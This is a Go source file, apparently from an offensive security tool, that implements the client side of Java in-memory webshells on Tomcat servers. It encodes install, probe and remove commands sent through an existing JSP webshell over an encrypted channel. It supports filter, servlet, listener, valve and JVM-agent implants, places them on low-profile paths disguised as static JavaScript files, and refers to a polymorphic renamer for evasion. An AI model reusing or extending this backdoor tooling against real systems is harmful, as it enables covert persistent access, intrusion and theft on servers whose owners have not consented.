package scanner

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"
)

// Java 内存马类型。Tomcat 提供 filter/servlet/listener/valve，agent 是
// 独立于容器映射的 JVM 内 HTTP 监听（由同一个加密协议保护）。
const (
	MemshellTypeFilter   = "filter"
	MemshellTypeServlet  = "servlet"
	MemshellTypeListener = "listener"
	MemshellTypeValve    = "valve"
	MemshellTypeAgent    = "agent"
)

// MemshellTypes lists every installable Java memory-shell type.
var MemshellTypes = []string{
	MemshellTypeFilter,
	MemshellTypeServlet,
	MemshellTypeListener,
	MemshellTypeValve,
	MemshellTypeAgent,
}

// NormalizeMemshellType validates a user-supplied type.
func NormalizeMemshellType(t string) (string, bool) {
	t = strings.ToLower(strings.TrimSpace(t))
	for _, v := range MemshellTypes {
		if v == t {
			return t, true
		}
	}
	return "", false
}

// MemshellSpec is one install request handed to the parent JSP shell.
type MemshellSpec struct {
	Type    string
	Name    string
	Path    string
	Key     []byte
	Carrier string
	Port    int // agent 型监听端口；0 表示自动分配
}

// GenerateMemshellName returns a container-safe unique registration name.
func GenerateMemshellName() (string, error) {
	s, err := randomHex(6)
	if err != nil {
		return "", err
	}
	return "ms_" + s, nil
}

// GenerateMemshellPath returns a low-profile endpoint below /static/.
func GenerateMemshellPath() (string, error) {
	s, err := randomHex(8)
	if err != nil {
		return "", err
	}
	return "/static/" + s + ".js", nil
}

var memshellValuePattern = `^[A-Za-z0-9_./-]+$`

// ValidateMemshellSpec rejects values that would break the compact M record.
func ValidateMemshellSpec(spec MemshellSpec) error {
	if _, ok := NormalizeMemshellType(spec.Type); !ok {
		return errors.New("不支持的内存马类型")
	}
	if !validMemshellValue(spec.Name) {
		return errors.New("内存马名称无效")
	}
	if !validMemshellValue(spec.Path) || !strings.HasPrefix(spec.Path, "/") {
		return errors.New("内存马路径无效")
	}
	if len(spec.Key) != 32 {
		return errors.New("内存马密钥必须是 32 字节")
	}
	if !shellCarrierPattern.MatchString(spec.Carrier) {
		return errors.New("内存马载体名称无效")
	}
	if spec.Port < 0 || spec.Port > 65535 {
		return errors.New("监听端口无效")
	}
	return nil
}

func validMemshellValue(v string) bool {
	if v == "" || len(v) > 200 {
		return false
	}
	for _, r := range v {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '_' || r == '.' || r == '/' || r == '-':
		default:
			return false
		}
	}
	return true
}

// MemshellWireInstall encodes an install request for the parent JSP's M op.
func MemshellWireInstall(spec MemshellSpec) ([]byte, error) {
	if err := ValidateMemshellSpec(spec); err != nil {
		return nil, err
	}
	parts := []string{
		"action=install",
		"type=" + spec.Type,
		"name=" + spec.Name,
		"path=" + spec.Path,
		"key=" + EncodeShellKey(spec.Key),
		"carrier=" + spec.Carrier,
	}
	if spec.Port > 0 {
		parts = append(parts, fmt.Sprintf("port=%d", spec.Port))
	}
	return shellWireOp('M', []byte(strings.Join(parts, "&"))), nil
}

// MemshellWireRemove encodes a removal request for the parent JSP's M op.
func MemshellWireRemove(kind, name, path string) ([]byte, error) {
	if _, ok := NormalizeMemshellType(kind); !ok {
		return nil, errors.New("不支持的内存马类型")
	}
	if !validMemshellValue(name) {
		return nil, errors.New("内存马名称无效")
	}
	if path != "" && !validMemshellValue(path) {
		return nil, errors.New("内存马路径无效")
	}
	return shellWireOp('M', []byte("action=remove&type="+kind+"&name="+name+"&path="+path)), nil
}

// MemshellWireProbe asks the parent shell what the target JVM supports.
func MemshellWireProbe() []byte {
	return shellWireOp('M', []byte("action=probe"))
}

// MemshellPayload builds the client-side payload for an injected memory shell.
// It speaks the same v2 channel as a JSP file shell but with its own key.
func MemshellPayload(key []byte, carrier string) (ShellPayload, error) {
	if len(key) != 32 {
		return ShellPayload{}, errors.New("内存马密钥必须是 32 字节")
	}
	if !shellCarrierPattern.MatchString(carrier) {
		return ShellPayload{}, errors.New("内存马载体名称无效")
	}
	return ShellPayload{
		Type:       "jsp",
		Protocol:   ShellProtocolV2,
		Key:        append([]byte{}, key...),
		Carrier:    carrier,
		KeyVersion: 1,
	}, nil
}

// SendShellWire sends one encrypted op through an existing v2 shell.
func SendShellWire(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, wire []byte) (string, error) {
	if p.Protocol != ShellProtocolV2 {
		return "", errors.New("只有加密 v2 webshell 支持该操作")
	}
	req, err := p.v2Request(shellURL, wire)
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("webshell 返回 HTTP %d（认证失败、重放或 shell 已失效）", resp.StatusCode)
	}
	return decodeShellResponse(p, resp.Body)
}

// ParseMemshellAck parses the plaintext ack of an M operation:
//
//	MSOK\nk=v\n...
//	MSERR\nmsg=...
func ParseMemshellAck(out string) (string, map[string]string, error) {
	lines := strings.Split(strings.ReplaceAll(out, "\r\n", "\n"), "\n")
	if len(lines) == 0 {
		return "", nil, errors.New("内存马响应为空")
	}
	code := strings.TrimSpace(lines[0])
	if code != "MSOK" && code != "MSERR" && code != "MSINFO" {
		return "", nil, fmt.Errorf("内存马响应语义异常: %s", truncateForError(out))
	}
	fields := map[string]string{}
	for _, line := range lines[1:] {
		if line == "" {
			continue
		}
		k, v, ok := strings.Cut(line, "=")
		if !ok {
			continue
		}
		fields[strings.TrimSpace(k)] = v
	}
	return code, fields, nil
}

func truncateForError(s string) string {
	s = strings.TrimSpace(s)
	if len(s) > 80 {
		return s[:80] + "..."
	}
	return s
}

// MemshellSelfDeleteOK / MemshellSelfDeleteFailed are the D-op markers used by
// the injected runtime. They start with "_" so the polymorphic renamer leaves
// them untouched.
const (
	MemshellSelfDeleteOK     = "__JWMS_DEL_OK__"
	MemshellSelfDeleteFailed = "__JWMS_DEL_FAIL__"
)

// MemshellSelfRemove asks an injected memory shell to unregister itself.
func MemshellSelfRemove(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload) (string, error) {
	if p.Protocol != ShellProtocolV2 {
		return "", errors.New("只有加密 v2 内存马支持自移除")
	}
	req, err := p.v2Request(shellURL, shellWireDelete())
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("内存马返回 HTTP %d", resp.StatusCode)
	}
	out, err := decodeShellResponse(p, resp.Body)
	if err != nil {
		return "", fmt.Errorf("自移除回执无效: %v", err)
	}
	return strings.TrimSpace(out), nil
}

// VerifyMemshellRemoved confirms the endpoint no longer speaks the protocol.
// A closed agent port is treated as removed; ambiguous HTTP errors are not.
// Agent shells answer the delete ack before their own listener stops, so the
// alive path is retried briefly for agents instead of failing on the race.
func VerifyMemshellRemoved(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, allowClosed bool) (bool, string) {
	deadline := time.Now().Add(4 * time.Second)
	var note string
	for {
		var alive bool
		alive, note = CheckShellAlive(ctx, c, shellURL, p)
		if !alive {
			break
		}
		if !allowClosed || time.Now().After(deadline) {
			return false, "内存马仍响应协议请求"
		}
		select {
		case <-ctx.Done():
			return false, "复核请求被取消"
		case <-time.After(400 * time.Millisecond):
		}
	}
	resp := c.Do(ctx, DeepRequest{Method: "GET", URL: shellURL})
	switch {
	case resp.Error != "":
		if allowClosed {
			return true, "监听端口已关闭（" + note + "）"
		}
		return false, "复核请求失败：" + resp.Error + "（协议探测：" + note + "）"
	case resp.StatusCode == 404 || resp.StatusCode == 410:
		return true, fmt.Sprintf("HTTP %d，协议请求已被拒绝", resp.StatusCode)
	case resp.StatusCode >= 200 && resp.StatusCode < 400:
		if _, err := decodeShellResponse(p, resp.Body); err != nil {
			return true, fmt.Sprintf("HTTP %d，响应中无协议标记", resp.StatusCode)
		}
		return false, "响应仍包含有效协议回执"
	}
	return false, fmt.Sprintf("HTTP %d，无法确认已移除", resp.StatusCode)
}

// MemshellURLsFor derives the candidate endpoints of an injected shell from the
// parent shell URL. Filter/servlet/listener/valve mappings belong to the web
// application context that owns the parent shell, so a shell at /lab/upload/
// x.jsp answers under /lab<path> (and possibly /lab/upload<path>), never only
// under the bare path. Agent shells listen on their own port and have no
// context. Every candidate is returned in the order it should be probed; only
// the context that actually registered the mapping replies with this shell's
// key, so trying the others is harmless.
func MemshellURLsFor(parentURL, shellPath string, port int) ([]string, error) {
	u, err := url.Parse(strings.TrimSpace(parentURL))
	if err != nil || u.Hostname() == "" {
		return nil, errors.New("父 webshell 地址无效")
	}
	scheme := u.Scheme
	if scheme == "" {
		scheme = "http"
	}
	host := u.Host
	if port > 0 {
		return []string{"http://" + net.JoinHostPort(u.Hostname(), fmt.Sprintf("%d", port)) + shellPath}, nil
	}
	out := []string{}
	seen := map[string]bool{}
	add := func(prefix string) {
		candidate := scheme + "://" + host + strings.TrimSuffix(prefix, "/") + shellPath
		if seen[candidate] {
			return
		}
		seen[candidate] = true
		out = append(out, candidate)
	}
	acc := ""
	for _, segment := range strings.Split(strings.Trim(u.Path, "/"), "/") {
		if segment == "" || strings.Contains(segment, ".") {
			continue
		}
		acc += "/" + segment
		add(acc)
	}
	add("")
	return out, nil
}
